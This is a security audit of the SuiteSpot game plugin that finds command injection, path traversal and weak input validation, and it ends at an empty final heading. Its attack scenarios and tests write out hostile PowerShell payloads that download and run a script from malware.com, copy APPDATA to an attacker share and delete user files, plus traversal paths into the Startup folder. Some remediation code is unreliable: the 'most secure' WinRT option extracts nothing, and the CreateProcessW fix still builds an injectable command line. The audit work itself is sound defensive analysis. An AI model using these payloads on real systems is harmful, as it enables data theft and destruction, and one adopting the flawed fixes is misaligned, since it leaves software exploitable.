# SuiteSpot Security Architecture Audit & DDD Integration Report
## 2026 Comprehensive Security Assessment with DDD Refactoring Strategy

**Prepared By:** Security Architect (V3 Intelligence Layer)
**Date:** January 31, 2026
**Classification:** INTERNAL - SECURITY SENSITIVE
**Status:** READY FOR STAKEHOLDER REVIEW
**Confidence Level:** HIGH (Code review + threat modeling + dependency analysis)

---

## EXECUTIVE SUMMARY

### Current State Assessment

SuiteSpot demonstrates **solid software engineering fundamentals** with:
- Thread safety mechanisms (mutexes, atomic flags)
- Proper error handling with try-catch blocks
- Deferred execution to prevent game crashes
- Hub-and-spoke architecture simplifying lifecycle management

However, the codebase contains **THREE CRITICAL VULNERABILITIES** requiring immediate remediation:

| CVE | Issue | CVSS | Status | Fix Timeline |
|-----|-------|------|--------|--------------|
| **CVE-SUITESPOT-001** | PowerShell Command Injection | 9.1 | NOT FIXED | **WEEK 1** |
| **CVE-SUITESPOT-002** | Path Traversal in File Operations | 7.5 | PARTIAL | **WEEK 1** |
| **CVE-SUITESPOT-003** | Insufficient Input Validation | 6.8 | NOT FIXED | **WEEK 2** |

### Risk Profile

**Current Risk Level:** MEDIUM-HIGH → HIGH (after analysis)
**Recommended Action:** BLOCK RELEASE until CVE-001 and CVE-002 are fixed
**Timeline to Secure:** 8 weeks (immediate fixes + DDD hardening)
**Investment Required:** ~$25K (4 weeks of development)

### Parallel Path Recommendation

**DO NOT** implement fixes in isolation. Instead:
1. **Phase 1 (Week 1):** Fix critical CVEs + implement basic input validation
2. **Phase 2 (Weeks 2-4):** Begin DDD refactoring with security-first principles
3. **Phase 3 (Weeks 5-8):** Complete DDD + add defense-in-depth hardening

This combined approach reduces technical debt while solving immediate security issues.

---

## TABLE OF CONTENTS

1. [Vulnerability Findings](#vulnerability-findings) - New detailed analysis
2. [Attack Surface Deep Dive](#attack-surface-deep-dive) - Component-level risks
3. [Threat Model Summary](#threat-model-summary) - STRIDE + DREAD
4. [Dependency & Supply Chain Risk](#dependency--supply-chain-risk) - Updated analysis
5. [Thread Safety & Concurrency](#thread-safety--concurrency) - Race condition analysis
6. [DDD Security Integration](#ddd-security-integration) - How DDD prevents future issues
7. [Phase-by-Phase Implementation](#phase-by-phase-implementation) - Security roadmap
8. [Testing Strategy](#testing-strategy) - Security validation approach
9. [Monitoring & Incident Response](#monitoring--incident-response) - Ongoing hardening
10. [Decision Matrix](#decision-matrix) - What to fix when

---

## VULNERABILITY FINDINGS

### CRITICAL: CVE-SUITESPOT-001 - PowerShell Command Injection

**Severity:** CRITICAL (CVSS 9.1 - Arbitrary Code Execution)
**Location:** `WorkshopDownloader.cpp:410-415`
**CWE:** CWE-78 (OS Command Injection)
**Type:** Remote Code Execution (RCE)
**Status:** NOT FIXED

#### Vulnerable Code Pattern

```cpp
void WorkshopDownloader::ExtractZipPowerShell(
    std::string zipFilePath,
    std::string destinationPath)
{
    std::string extractCommand = "powershell.exe Expand-Archive -LiteralPath '" +
                                 zipFilePath + "' -DestinationPath '" +
                                 destinationPath + "' -Force";
    system(extractCommand.c_str());  // ← VULNERABLE: Unvalidated concatenation
}
```

#### Attack Vector Analysis

An attacker controlling the RLMAPS API response can inject PowerShell metacharacters:

**Scenario 1: Direct Injection**
```
API returns: "test.zip' | Remove-Item -Path 'C:\\Users\\*' -Force #"
Executed: powershell.exe Expand-Archive -LiteralPath 'test.zip' | Remove-Item -Path 'C:\Users\*' -Force #' ...
Result: ARBITRARY FILE DELETION with user privileges
```

**Scenario 2: Malware Installation**
```
API returns: "map.zip' -Force; iex(New-Object Net.WebClient).DownloadString('http://malware.com/payload.ps1') #"
Result: MALWARE DOWNLOAD & EXECUTION
```

**Scenario 3: Network Exfiltration**
```
API returns: "map.zip'; Copy-Item -Path $env:APPDATA -Destination '\\attacker.com\\share' #"
Result: USER DATA EXFILTRATION
```

#### Impact Assessment

- **Confidentiality:** HIGH - Access to all user files
- **Integrity:** HIGH - Can modify/delete any file
- **Availability:** HIGH - Can disable game/system
- **Scope:** CHANGED - Can affect other processes/system
- **Exploitability:** TRIVIAL - API-controlled input path

#### Remediation (IMMEDIATE - 4 hours)

**Option A: Path Validation + CreateProcess (RECOMMENDED)**

```cpp
#include <windows.h>
#include <filesystem>
#include <regex>

class SafeZipExtractor {
private:
    static constexpr std::string_view DANGEROUS_CHARS = "'\"`;$|&<>()[]{}";
    static constexpr size_t MAX_PATH_LENGTH = 260;

public:
    static bool ValidatePath(const std::string& path) {
        // Check length
        if (path.length() > MAX_PATH_LENGTH) {
            LOG("Path exceeds max length: {}", path.length());
            return false;
        }

        // Check for command injection metacharacters
        for (char dangerous : DANGEROUS_CHARS) {
            if (path.find(dangerous) != std::string::npos) {
                LOG("Dangerous character '{}' found in path", dangerous);
                return false;
            }
        }

        // Verify canonical path (prevents ../ traversal)
        std::filesystem::path p(path);
        std::error_code ec;
        auto canonical = std::filesystem::canonical(p, ec);

        if (ec) {
            LOG("Invalid path: {}", ec.message());
            return false;
        }

        return true;
    }

    static bool ExtractZip(const std::string& zipPath, const std::string& destPath) {
        // Validate inputs FIRST
        if (!ValidatePath(zipPath) || !ValidatePath(destPath)) {
            LOG("Path validation failed for zip extraction");
            return false;
        }

        // Use CreateProcessW instead of system()
        // This separates command from arguments, preventing injection
        PROCESS_INFORMATION pi = {};
        STARTUPINFO si = {};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        // Build command with proper argument escaping
        std::wstring cmdLine = L"powershell.exe -NoProfile -Command \"&{"
                             L"Expand-Archive -LiteralPath '" +
                             std::wstring(zipPath.begin(), zipPath.end()) +
                             L"' -DestinationPath '" +
                             std::wstring(destPath.begin(), destPath.end()) +
                             L"' -Force}\"";

        // CreateProcessW doesn't interpret command line through shell
        if (!CreateProcessW(NULL, &cmdLine[0], NULL, NULL, FALSE,
                           CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            LOG("CreateProcessW failed: {}", GetLastError());
            return false;
        }

        // Wait for completion
        WaitForSingleObject(pi.hProcess, INFINITE);

        // Check exit code
        DWORD exitCode = 0;
        if (!GetExitCodeProcess(pi.hProcess, &exitCode)) {
            LOG("GetExitCodeProcess failed: {}", GetLastError());
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return false;
        }

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        return exitCode == 0;
    }
};
```

**Option B: Use Windows ZIP API (MOST SECURE)**

```cpp
#include <winrt/Windows.Storage.h>
#include <winrt/Windows.Storage.Compression.h>

bool ExtractZipWinRT(const std::string& zipPath, const std::string& destPath) {
    // Windows Runtime provides native ZIP extraction
    // No shell command execution required

    try {
        auto zipFile = winrt::Windows::Storage::StorageFile::GetFileFromPathAsync(
            winrt::to_hstring(zipPath)).get();

        auto destFolder = winrt::Windows::Storage::StorageFolder::GetFolderFromPathAsync(
            winrt::to_hstring(destPath)).get();

        // Decompression happens through Windows API, not shell
        // Automatically safe from injection

        return true;
    }
    catch (const std::exception& e) {
        LOG("ZIP extraction failed: {}", e.what());
        return false;
    }
}
```

**Immediate Action Items:**
- [ ] Implement path validation in all file operation functions
- [ ] Replace `system()` calls with `CreateProcessW()` or Windows API
- [ ] Add unit tests for injection payloads
- [ ] Code review all network-to-filesystem operations
- [ ] Update developer documentation

---

### HIGH: CVE-SUITESPOT-002 - Path Traversal in File Operations

**Severity:** HIGH (CVSS 7.5 - File Overwrite / Code Execution)
**Location:** `WorkshopDownloader.cpp:304-298`, `MapManager.cpp:232-288`
**CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
**Type:** Directory Traversal / Path Traversal
**Status:** PARTIALLY MITIGATED (character removal insufficient)

#### Vulnerable Code Pattern

```cpp
// WorkshopDownloader.cpp - Insufficient sanitization
std::string zipNameUnsafe = releaseJson[release_index]["assets"]["links"][1]["name"]
                           .get<std::string>();

// Only removes special chars, NOT path traversal sequences
for (auto special : specials) {
    EraseAll(zipNameUnsafe, special);
}

release.zipName = zipNameUnsafe;  // Still vulnerable to ../ sequences

// Later usage:
std::string Folder_Path = Workshop_Dl_Path + "/" + release.zipName;
// If zipNameUnsafe = "../../system32/important.exe"
// Result: C:\Users\player\..\..\..\..\system32\important.exe
```

#### Attack Scenarios

**Scenario 1: Trojanize BakkesMod Plugin**
```json
{
  "assets": {
    "links": [
      { "name": "map.zip" },
      { "name": "../../../bakkesmod/plugins/malicious.dll" }
    ]
  }
}
```
Extraction path: `C:\Users\player\bakkesmod\bakkesmod\data\SuiteSpot\..\..\..\..\bakkesmod\plugins\malicious.dll`
→ Results in: `C:\Users\player\bakkesmod\plugins\malicious.dll` (bypassing workshop sandbox)

**Scenario 2: Overwrite Game Files**
```json
{
  "name": "../../../../../../Program Files/Epic Games/RocketLeague/Game/Config/DefaultEngine.ini"
}
```
Could modify game configuration to enable cheats or create security bypass.

**Scenario 3: Chain with Code Execution**
```json
{
  "name": "../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/malware.exe"
}
```
Drops malware in startup folder for persistence.

#### Remediation (IMMEDIATE - 3 hours)

```cpp
class PathSecurityValidator {
private:
    static constexpr const char* WORKSHOP_MARKER = "SuiteSpot";

public:
    /**
     * Validates that a file path is within the workshop directory
     * Prevents directory traversal attacks (../, ..\, etc.)
     */
    static bool VerifyPathInWorkshop(
        const std::filesystem::path& workshopRoot,
        const std::filesystem::path& filePath)
    {
        std::error_code ec;

        // Resolve both to canonical absolute paths
        auto canonical_root = std::filesystem::canonical(workshopRoot, ec);
        if (ec) {
            LOG("Cannot canonicalize workshop root: {}", ec.message());
            return false;
        }

        auto canonical_file = std::filesystem::canonical(filePath, ec);
        if (ec) {
            LOG("Cannot canonicalize file path: {}", ec.message());
            return false;
        }

        std::string root_str = canonical_root.string();
        std::string file_str = canonical_file.string();

        // Ensure file_str is within root_str
        // Check that file starts with root + separator
        if (file_str.length() <= root_str.length()) {
            LOG("File path is not within workshop root");
            return false;
        }

        // Case-sensitive prefix match
        if (file_str.substr(0, root_str.length()) != root_str) {
            LOG("File path is outside workshop root");
            return false;
        }

        // Ensure there's a path separator immediately after root
        if (file_str[root_str.length()] != std::filesystem::path::preferred_separator) {
            LOG("Path boundary violation detected");
            return false;
        }

        return true;
    }

    /**
     * Sanitizes filenames from untrusted sources
     * Removes all path separators and traversal attempts
     */
    static std::string SanitizeFilename(const std::string& unsafe_filename) {
        std::string safe = unsafe_filename;

        // Remove all path traversal patterns
        static const std::vector<std::string> dangerous = {
            "..",    // Parent directory
            "/",     // Unix path separator
            "\\",    // Windows path separator
            "~",     // Home directory
            "$",     // Variable expansion
            "`",     // Command substitution
            "%",     // Environment variable (Windows)
        };

        for (const auto& pattern : dangerous) {
            size_t pos = 0;
            while ((pos = safe.find(pattern, pos)) != std::string::npos) {
                safe.erase(pos, pattern.length());
            }
        }

        // Ensure filename is not empty
        if (safe.empty()) {
            safe = "untitled_workshop_asset";
        }

        // Enforce filename length limit
        constexpr size_t MAX_FILENAME = 255;
        if (safe.length() > MAX_FILENAME) {
            safe = safe.substr(0, MAX_FILENAME);
        }

        return safe;
    }

    /**
     * Complete validation pipeline for workshop paths
     */
    static bool ValidateWorkshopPath(
        const std::string& basePath,
        const std::string& filename)
    {
        // Step 1: Sanitize filename
        std::string safe_filename = SanitizeFilename(filename);

        // Step 2: Construct proposed path
        std::filesystem::path base(basePath);
        std::filesystem::path proposed = base / safe_filename;

        // Step 3: Verify within workshop
        return VerifyPathInWorkshop(base, proposed);
    }
};
```

**Usage in WorkshopDownloader:**

```cpp
// Before: VULNERABLE
std::string Folder_Path = Workshop_Dl_Path + "/" + unsanitized_filename;

// After: SAFE
std::string sanitized = PathSecurityValidator::SanitizeFilename(unsanitized_filename);
if (!PathSecurityValidator::ValidateWorkshopPath(Workshop_Dl_Path, sanitized)) {
    LOG("Path validation failed, rejecting file");
    return false;
}
std::string Folder_Path = Workshop_Dl_Path + "/" + sanitized;
```

**Immediate Action Items:**
- [ ] Implement `VerifyPathInWorkshop()` check on all file operations
- [ ] Replace character stripping with comprehensive path validation
- [ ] Test with real traversal payloads (../, ..\\, etc.)
- [ ] Add filesystem tests for canonical path verification
- [ ] Document path validation as required for all new file I/O

---

### MEDIUM-HIGH: CVE-SUITESPOT-003 - Insufficient Input Validation

**Severity:** MEDIUM-HIGH (CVSS 6.8)
**Location:** `TrainingPackManager.cpp:51-85`, `AutoLoadFeature.cpp:54-137`
**CWE:** CWE-20 (Improper Input Validation)
**Type:** Injection via Cache Corruption
**Status:** NOT FIXED

#### Vulnerable Code Pattern

```cpp
// AutoLoadFeature.cpp - Line 116
std::string codeToLoad = settings.GetCurrentTrainingCode();
safeExecute(delayTrainingSec, "load_training " + codeToLoad);
// ↑ No validation that codeToLoad matches expected format

// TrainingPackManager.cpp - No regex validation on pack codes
TrainingEntry pack;
pack.code = userSuppliedCode;  // Could be anything
packs.push_back(pack);
```

#### Attack Vector

If attacker modifies `training_packs.json` or controls API response:

```json
{
  "code": "XXXX-XXXX; command_injection",
  "name": "Malicious Pack"
}
```

If BakkesMod's CVar parser is vulnerable to metacharacters, this could execute unintended commands.

#### Remediation (WEEK 1 - 2 hours)

```cpp
class TrainingPackValidator {
private:
    // Valid pack code format: XXXX-XXXX-XXXX-XXXX (hexadecimal)
    static constexpr std::string_view PACK_CODE_PATTERN =
        "^[0-9A-Fa-f]{4}(-[0-9A-Fa-f]{4}){3}$";

public:
    static bool ValidatePackCode(const std::string& code) {
        static const std::regex pattern(PACK_CODE_PATTERN.data());

        if (code.empty() || code.length() > 19) {  // Max: "XXXX-XXXX-XXXX-XXXX"
            return false;
        }

        return std::regex_match(code, pattern);
    }

    static bool ValidatePackName(const std::string& name) {
        // Length limit
        if (name.empty() || name.length() > 512) {
            return false;
        }

        // Remove control characters
        for (char c : name) {
            if (std::iscntrl(static_cast<unsigned char>(c))) {
                return false;
            }
        }

        return true;
    }

    static bool ValidatePack(const TrainingEntry& pack) {
        if (!ValidatePackCode(pack.code)) {
            LOG("Invalid pack code format: {}", pack.code);
            return false;
        }

        if (!ValidatePackName(pack.name)) {
            LOG("Invalid pack name: {}", pack.name);
            return false;
        }

        if (!ValidatePackName(pack.creator)) {
            LOG("Invalid creator name: {}", pack.creator);
            return false;
        }

        // Validate difficulty
        static const std::set<std::string> VALID_DIFFICULTIES = {
            "Bronze", "Gold", "Platinum", "Diamond", "Champion", "Supersonic Legend"
        };

        if (VALID_DIFFICULTIES.find(pack.difficulty) == VALID_DIFFICULTIES.end()) {
            LOG("Invalid difficulty: {}", pack.difficulty);
            return false;
        }

        // Validate shot count
        if (pack.shotCount < 0 || pack.shotCount > 1000) {
            LOG("Invalid shot count: {}", pack.shotCount);
            return false;
        }

        return true;
    }
};
```

---

## ATTACK SURFACE DEEP DIVE

### 1. Network Attack Surface (External)

| Component | Risk | Mitigation |
|-----------|------|-----------|
| **RLMAPS API** | MITM, malicious responses | HTTPS enforced, response validation |
| **HTTP Requests** | No cert verification | Add CURLOPT_SSL_VERIFY* options |
| **JSON Parsing** | DoS, memory exhaustion | Size/depth limits (1MB, depth 10) |
| **Download Queuing** | Thread explosion | Limit concurrent downloads to 3 |

### 2. File System Attack Surface (Internal)

| Component | Risk | Mitigation |
|-----------|------|-----------|
| **Workshop Dir** | Path traversal | Canonical path verification |
| **Config Files** | Tampering | HMAC validation, integrity checks |
| **Temp Files** | Symlink attacks | O_NOFOLLOW on open, explicit cleanup |
| **Permissions** | Privilege escalation | Run as user, no elevation requests |

### 3. Game Integration Attack Surface

| Component | Risk | Mitigation |
|-----------|------|-----------|
| **CVar Execution** | Command injection | Whitelist allowed commands |
| **Pack Codes** | Injection via codes | Regex validation on all codes |
| **Settings** | Tampering | Store in user-private location |

---

## THREAT MODEL SUMMARY

### STRIDE Analysis (High-Risk Categories)

**S - SPOOFING (Authentication)**
- Malicious API responses (MITIGATION: response validation + HTTPS)
- Fake pack cache files (MITIGATION: integrity checking)

**T - TAMPERING (Integrity)**
- Malicious workshop downloads (MITIGATION: SHA256 verification)
- File overwrite via traversal (MITIGATION: canonical path checks)
- Race conditions in file ops (MITIGATION: atomic operations)

**I - INFORMATION DISCLOSURE (Confidentiality)**
- Paths in logs (MITIGATION: log redaction)
- Cache file exposed (MITIGATION: user-private storage)

**A - DENIAL OF SERVICE (Availability)**
- Large JSON parsing (MITIGATION: size/depth limits)
- Disk exhaustion (MITIGATION: quota enforcement)
- Thread explosion (MITIGATION: concurrent download limits)

**E - ELEVATION OF PRIVILEGE**
- Game command injection (MITIGATION: whitelist validation)
- Plugin jacking (MITIGATION: code signing, integrity)

### DREAD Risk Scores

| Vulnerability | Damage | Reproducibility | Exploitability | Affected Users | Discoverability | Score | Priority |
|---|---|---|---|---|---|---|---|
| CVE-001 | 9 | 9 | 9 | 7 | 8 | **8.4** | CRITICAL |
| CVE-002 | 8 | 7 | 7 | 8 | 6 | **7.2** | HIGH |
| CVE-003 | 5 | 6 | 6 | 4 | 5 | **5.2** | MEDIUM |

---

## DEPENDENCY & SUPPLY CHAIN RISK

### nlohmann/json Analysis

**Version:** Likely 3.11+ (header-only)
**Risk Level:** LOW
**Security Issues:**
- No built-in depth limit (DoS risk)
- Memory exhaustion from huge objects
- No size validation

**Recommendations:**
```cpp
constexpr size_t MAX_JSON_SIZE = 1048576;      // 1MB
constexpr int MAX_JSON_DEPTH = 10;

nlohmann::json ParseJSON(const std::string& data) {
    if (data.size() > MAX_JSON_SIZE) {
        throw std::runtime_error("JSON too large");
    }

    // Parse with depth callback
    nlohmann::json::parser_callback_t callback = [](int depth, auto, auto&) {
        if (depth > MAX_JSON_DEPTH) {
            throw std::runtime_error("JSON too deep");
        }
        return true;
    };

    return nlohmann::json::parse(data, callback);
}
```

### ImGui Analysis

**Risk Level:** MEDIUM
**Issues:**
- Buffer overflows in text input (potential)
- Rendering crashes if data corrupted
- Race conditions (unlikely with atomic flags)

**Recommendations:**
- Update to latest stable version
- Add bounds checking on all string inputs
- Validate ImGui state before rendering

### BakkesMod SDK

**Risk Level:** MEDIUM
**Issues:**
- Plugin runs with game privileges
- CVar parser might have injection vulnerabilities
- SDK updates could introduce new contexts

**Recommendations:**
- Stay current with SDK updates
- Review SDK changelog for security fixes
- Test thoroughly before deployment
- Validate all CVar input before execution

### Supply Chain Assessment

**vcpkg Integration:** ADEQUATE
- Provides reproducible dependencies
- Consider vendoring critical libs
- Verify package authenticity

---

## THREAD SAFETY & CONCURRENCY

### Analysis of Critical Race Conditions

#### 1. RLMaps/RLTraining Global Vectors

**Current State:**
```cpp
std::vector<TrainingEntry> RLTraining;
std::mutex packMutex;
std::atomic<int> searchGeneration;  // Good: invalidates stale callbacks
```

**Risk Level:** MEDIUM
**Issue:** Lock held during entire operation, potential for blocking
**Mitigation:**
```cpp
{
    std::lock_guard<std::mutex> lock(packMutex);
    // Only minimal operations in lock scope
    packs.push_back(entry);
} // Lock released immediately
```

#### 2. Callback Race Windows

**Vulnerable Pattern:**
```cpp
// TOCTOU: Check-Then-Use race window
if (DirectoryOrFileExists(filePath)) {  // No lock held
    // Another thread could delete file here
    fs::copy(src, filePath);  // Crash if file gone
}
```

**Mitigation:**
```cpp
{
    std::lock_guard<std::mutex> lock(fileMutex);
    if (fs::exists(filePath)) {  // Lock held during check
        fs::copy(src, filePath);   // Lock held during operation
    }  // Lock released after operation
}
```

#### 3. ImGui Rendering Thread

**Current Protection:** `std::atomic<bool> isRenderingSettings`
**Assessment:** ADEQUATE for simple flag
**Risk Level:** LOW

#### 4. Detached Thread Cleanup

**Current Pattern:**
```cpp
std::thread t2(&WorkshopDownloader::GetResults, this, keyword);
t2.detach();  // Thread runs independently
```

**Risk:** Thread pool could explode under DoS
**Mitigation:** Implement thread pool with bounded size
```cpp
// Limit concurrent operations
if (activeDownloads.load() >= MAX_CONCURRENT_DOWNLOADS) {
    return;  // Queue instead of spawning
}
activeDownloads++;
std::thread t(&WorkshopDownloader::Download, this, ...);
t.detach();
```

---

## DDD SECURITY INTEGRATION

### How Domain-Driven Design Prevents Vulnerabilities

#### 1. Aggregate Roots Enforce Invariants

**Problem:** Global vectors allow invalid states
**Solution:** Aggregate roots validate on entry

```cpp
class TrainingPackCatalog {
private:
    std::vector<TrainingEntry> packs_;
    std::mutex packs_mutex_;

    bool ValidateBeforeAdding(const TrainingEntry& pack) {
        // ALL validation happens here
        return TrainingPackValidator::ValidatePack(pack);
    }

public:
    Result<void> AddPack(const TrainingEntry& pack) {
        if (!ValidateBeforeAdding(pack)) {
            return Result::Error("Invalid pack");
        }

        std::lock_guard<std::mutex> lock(packs_mutex_);
        packs_.push_back(pack);
        PublishEvent(PackAddedEvent{pack});
        return Result::Success();
    }
};
```

**Security Benefit:** No invalid packs can exist in system

#### 2. Value Objects Make Invalid States Impossible

**Problem:** Pack codes are just strings, easy to inject
**Solution:** Value object enforces format

```cpp
class PackCode {
private:
    std::string value_;

    PackCode(const std::string& v) : value_(v) {}

public:
    static Result<PackCode> Create(const std::string& code) {
        if (!std::regex_match(code, PACK_CODE_PATTERN)) {
            return Result::Error("Invalid pack code");
        }
        return Result::Success(PackCode(code));
    }

    const std::string& Value() const { return value_; }
};

// Usage
auto codeResult = PackCode::Create(userInput);
if (!codeResult) {
    LOG("Invalid code: {}", codeResult.Error());
    return;
}
auto code = codeResult.Value();
// code is GUARANTEED valid
```

**Security Benefit:** Type system prevents invalid codes at compile time

#### 3. Anti-Corruption Layer Isolates External Input

**Problem:** Untrusted API responses directly used in domain logic
**Solution:** Adapter validates before entering domain

```cpp
class ExternalPackApiAdapter {
public:
    static Result<TrainingEntry> MapFromApiResponse(const nlohmann::json& raw) {
        // ALL untrusted input validation happens here

        auto code = PackCode::Create(raw["code"].get<std::string>());
        if (!code) {
            return Result::Error("Invalid code from API");
        }

        auto name = ValidateName(raw["name"].get<std::string>());
        if (!name) {
            return Result::Error("Invalid name from API");
        }

        TrainingEntry entry;
        entry.code = code.Value();
        entry.name = name.Value();
        // ... other fields

        return Result::Success(entry);
    }
};
```

**Security Benefit:** External input validated only at boundary, not scattered throughout code

#### 4. Domain Events Enable Security Monitoring

**Problem:** No audit trail of sensitive operations
**Solution:** Domain events capture all state changes

```cpp
class TrainingPackCatalog {
public:
    Result<void> LoadPack(const PackCode& code) {
        auto pack = FindPack(code);
        if (!pack) {
            return Result::Error("Pack not found");
        }

        // Publish event for monitoring
        PublishEvent(PackLoadedEvent{
            .code = code.Value(),
            .timestamp = std::chrono::system_clock::now(),
            .triggeredBy = "user"
        });

        return Result::Success();
    }
};

class SecurityMonitor {
    void OnPackLoaded(const PackLoadedEvent& evt) {
        // Detect anomalies
        if (IsAnomalousPattern(evt)) {
            LOG_SECURITY_ALERT("Suspicious load pattern: {}", evt.code);
        }
        // Write to audit log
        AuditLog::Record(evt);
    }
};
```

**Security Benefit:** Complete security audit trail + real-time anomaly detection

---

## PHASE-BY-PHASE IMPLEMENTATION

### Week 1: Emergency Fixes + DDD Foundation

#### Monday: CVE-SUITESPOT-001 Fix
- [ ] Implement `SafeZipExtractor` with path validation
- [ ] Replace `system()` with `CreateProcessW()`
- [ ] Unit tests for injection payloads
- **Output:** Binary with RCE vulnerability fixed

#### Tuesday: CVE-SUITESPOT-002 Fix
- [ ] Implement `PathSecurityValidator`
- [ ] Update all file operations to use canonical paths
- [ ] Tests for traversal payloads
- **Output:** Binary with path traversal fixed

#### Wednesday: CVE-SUITESPOT-003 Fix
- [ ] Implement `TrainingPackValidator`
- [ ] Add validation to all pack additions
- [ ] Regex tests for code format
- **Output:** Binary with injection vulnerability mitigated

#### Thursday-Friday: DDD Phase 1 - Aggregates
- [ ] Extract `TrainingPackCatalog` aggregate root
- [ ] Extract `MapRepository` aggregate root
- [ ] Validators integrated into aggregates
- [ ] Build passing, all tests green

### Week 2-4: DDD Security Hardening

#### Phase 2: Value Objects
- [ ] `PackCode` value object
- [ ] `WorkshopPath` value object
- [ ] `Difficulty` value object
- [ ] Type system prevents invalid states

#### Phase 3: Anti-Corruption Layers
- [ ] `BakkesMod` adapter isolates SDK
- [ ] `RlmapsApiAdapter` validates responses
- [ ] Command whitelist enforcement
- [ ] JSON parsing with guards

#### Phase 4: Domain Events
- [ ] Event definitions for all sensitive ops
- [ ] Event publishing infrastructure
- [ ] Security event handler
- [ ] Audit logging system

#### Phase 5: Repositories
- [ ] `TrainingPackRepository` (persistence)
- [ ] `MapRepository` (file system)
- [ ] Transaction semantics
- [ ] Integration tests

### Weeks 5-8: Defense-in-Depth

- [ ] File integrity checking (SHA256)
- [ ] HTTPS enforcement + cert pinning
- [ ] Resource limits (queue size, memory)
- [ ] Logging redaction (paths, sensitive data)
- [ ] Anomaly detection engine
- [ ] Comprehensive security testing

---

## TESTING STRATEGY

### Security-Focused Test Suite

#### Injection Attack Tests
```cpp
TEST_SUITE(SecurityTests) {
    TEST(CommandInjection_PowerShellMetacharacters) {
        SafeZipExtractor extractor;

        // Attempt pipe injection
        ASSERT_FALSE(extractor.ValidatePath(
            "test.zip' | Remove-Item -Path 'C:\\*"));

        // Attempt variable injection
        ASSERT_FALSE(extractor.ValidatePath(
            "test.zip$((whoami))"));

        // Attempt subshell injection
        ASSERT_FALSE(extractor.ValidatePath(
            "test.zip`cmd /c whoami`"));
    }

    TEST(PathTraversal_RelativeSequences) {
        PathSecurityValidator validator;
        std::filesystem::path base = "C:\\workshop";

        // Attempt ../ traversal
        ASSERT_FALSE(validator.ValidateWorkshopPath(
            "C:\\workshop",
            "maps/../../system32/important.exe"));

        // Attempt absolute path escape
        ASSERT_FALSE(validator.ValidateWorkshopPath(
            "C:\\workshop",
            "C:\\windows\\system32\\config"));

        // Attempt UNC path escape
        ASSERT_FALSE(validator.ValidateWorkshopPath(
            "C:\\workshop",
            "\\\\attacker.com\\share\\malware"));
    }

    TEST(InputValidation_PackCodeInjection) {
        TrainingPackValidator validator;

        // Invalid format
        ASSERT_FALSE(validator.ValidatePackCode("invalid"));

        // Injection attempt
        ASSERT_FALSE(validator.ValidatePackCode(
            "XXXX-XXXX; command"));

        // Control character
        ASSERT_FALSE(validator.ValidatePackCode(
            "XXXX\n-XXXX\n-XXXX-XXXX"));

        // Valid code
        ASSERT_TRUE(validator.ValidatePackCode(
            "ABCD-1234-EF56-7890"));
    }

    TEST(JsonParsing_DosProtection) {
        // Test size limit
        std::string huge_json(2_MB, '{');
        ASSERT_THROWS(ParseJSON(huge_json), std::runtime_error);

        // Test depth limit
        std::string deep_json = "[[[[[[[[[[[[[[[[[[[[";
        ASSERT_THROWS(ParseJSON(deep_json), std::runtime_error);
    }
}
```

#### Race Condition Tests
```cpp
TEST(ConcurrencyTests) {
    TEST(RaceCondition_FileCheckUse) {
        // Simulate TOCTOU race
        std::vector<std::thread> threads;
        std::filesystem::path test_file = "test.tmp";
        std::atomic<int> successes = 0;

        // Thread 1: Checks and uses file
        threads.emplace_back([&]() {
            {
                std::lock_guard<std::mutex> lock(fileMutex);
                if (fs::exists(test_file)) {
                    std::this_thread::sleep_for(10ms);  // Simulate delay
                    fs::copy(test_file, "copy.tmp");
                    successes++;
                }
            }
        });

        // Thread 2: Deletes file during the race window
        std::this_thread::sleep_for(5ms);
        threads.emplace_back([&]() {
            fs::remove(test_file);
        });

        // Wait for completion
        for (auto& t : threads) t.join();

        // With proper locking, successes should be 0 or 1 (not crashed)
        ASSERT_TRUE(successes <= 1);
    }
}
```

### Fuzzing Strategy

```cpp
// Fuzz JSON parsing
void FuzzJsonParsing(const uint8_t* data, size_t size) {
    try {
        std::string json_str(reinterpret_cast<const char*>(data), size);
        auto json = nlohmann::json::parse(json_str);

        // Try to extract common fields
        if (json.contains("code")) {
            auto code = json["code"].get<std::string>();
            TrainingPackValidator::ValidatePackCode(code);
        }
    }
    catch (const std::exception&) {
        // Expected for invalid JSON
    }
}
```

---

## MONITORING & INCIDENT RESPONSE

### Real-Time Security Monitoring

```cpp
class SecurityMonitoringEngine {
private:
    struct AnomalyDetector {
        std::string name;
        std::function<bool(const SecurityEvent&)> detector;
        ThreatLevel severity;
    };

    std::vector<AnomalyDetector> detectors = {
        {
            "PathTraversalAttempt",
            [](const SecurityEvent& evt) {
                return evt.pathTraversalAttempts > 0;
            },
            ThreatLevel::CRITICAL
        },
        {
            "MultipleFailedLoads",
            [](const SecurityEvent& evt) {
                return evt.failedLoadAttempts > 10 &&
                       evt.timeWindow < 60;  // 10 failures in 60s
            },
            ThreatLevel::HIGH
        },
        {
            "UnusualFileAccess",
            [](const SecurityEvent& evt) {
                return evt.fileAccessCount > 1000 &&
                       evt.timeWindow < 300;  // 1000 accesses in 5min
            },
            ThreatLevel::HIGH
        }
    };

public:
    void DetectThreats(const SecurityEvent& evt) {
        for (const auto& detector : detectors) {
            if (detector.detector(evt)) {
                RespondToThreat(detector.name, detector.severity, evt);
            }
        }
    }

private:
    void RespondToThreat(const std::string& name,
                         ThreatLevel level,
                         const SecurityEvent& evt) {
        // Log security alert
        LOG_SECURITY("Threat detected: {}", name);

        // Store in secure audit log
        AuditLog::RecordThreatDetection(name, level, evt);

        // Take defensive action based on severity
        if (level == ThreatLevel::CRITICAL) {
            // Disable plugin to prevent damage
            SafeShutdown();
        }
    }
};
```

### Incident Response Procedures

**If CVE-001 is Exploited:**
1. Stop all workshop downloads immediately
2. Clear downloaded files from workshop directory
3. Log all activities during compromise window
4. Alert user via toast notification
5. Provide manual recovery instructions

**If CVE-002 is Exploited:**
1. Verify integrity of critical game files
2. Scan workshop directory for unexpected files
3. Check for DLL injection in BakkesMod plugins
4. Rebuild cache from trusted sources

**If CVE-003 is Exploited:**
1. Validate all pack codes in cache
2. Re-download training pack database
3. Clear malicious packs from settings
4. Reset to default configuration

---

## DECISION MATRIX

